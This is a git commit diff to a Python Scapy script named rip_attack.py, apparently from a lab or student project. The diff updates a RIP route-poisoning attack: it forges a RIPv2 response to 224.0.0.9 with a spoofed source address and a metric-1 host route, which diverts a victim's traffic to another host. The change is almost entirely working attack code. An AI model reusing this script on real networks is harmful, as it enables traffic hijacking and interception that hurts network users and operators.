dd3812ed99a36104b5eceb5e5892430e82917851
Gabriel Crisan <gabicrisan01@gmail.com>
2026-01-22 11:56:53 +0200

    Update RIP Attack script

--- Internal Attacker/rip_attack.py
+++ Internal Attacker/rip_attack.py
@@ -8,13 +8,12 @@ host_mask = "255.255.255.255"
 print(f"Injecting MALICIOUS RIP route: traffic for {victim_ip} -> {new_destination_ip}")
 
 rip_packet = (
-    IP(dst="224.0.0.9") / 
-    UDP(sport=520, dport=520) / 
+    IP(src=new_destination_ip, dst="224.0.0.9") /
+    UDP(sport=520, dport=520) /
     RIP(cmd=2, version=2) /
     RIPEntry(
-        addr=victim_ip, 
-        mask=host_mask, 
-        next_hop=new_destination_ip,
+        addr=victim_ip,
+        mask=host_mask,
         metric=1
     )
 )
